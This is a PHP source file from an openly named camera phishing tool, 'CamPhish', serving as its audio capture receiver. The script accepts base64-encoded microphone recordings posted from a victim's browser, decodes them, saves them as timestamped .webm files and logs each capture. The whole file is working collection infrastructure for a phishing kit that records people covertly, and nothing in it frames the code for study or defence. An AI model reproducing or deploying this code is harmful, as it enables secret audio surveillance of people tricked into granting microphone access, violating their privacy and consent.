<?php
/**
 * CamPhish - Advanced Camera Phishing Tool
 * Audio Capture Receiver
 * 
 * @author     Rahul Kushwaha
 * @github     https://github.com/raahulllkushwaha
 * @repository https://github.com/raahulllkushwaha/Cam-Phisher
 * @license    GNU General Public License v3.0
 */

// Set JSON content type header
header('Content-Type: application/json');

// Create audio_captures directory if it doesn't exist
$audioDir = 'audio_captures';
if (!is_dir($audioDir)) {
    mkdir($audioDir, 0755, true);
}

// Get base64 audio data from POST
$base64Audio = isset($_POST['audio']) ? $_POST['audio'] : '';

if (!empty($base64Audio)) {
    // Decode base64 audio data
    $audioData = base64_decode($base64Audio);

    if ($audioData !== false) {
        // Generate filename with timestamp
        $timestamp = date('YmdHis');
        $filename = $audioDir . '/audio_' . $timestamp . '.webm';

        // Save audio file
        $saved = file_put_contents($filename, $audioData);

        if ($saved !== false) {
            // Create marker log file
            file_put_contents('AudioLog.log', "Audio captured at " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

            echo json_encode([
                'status' => 'success',
                'message' => 'Audio data received'
            ]);
        } else {
            echo json_encode([
                'status' => 'error',
                'message' => 'Could not save audio data'
            ]);
        }
    } else {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid base64 audio data'
        ]);
    }
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'No audio data received'
    ]);
}

exit();
?>
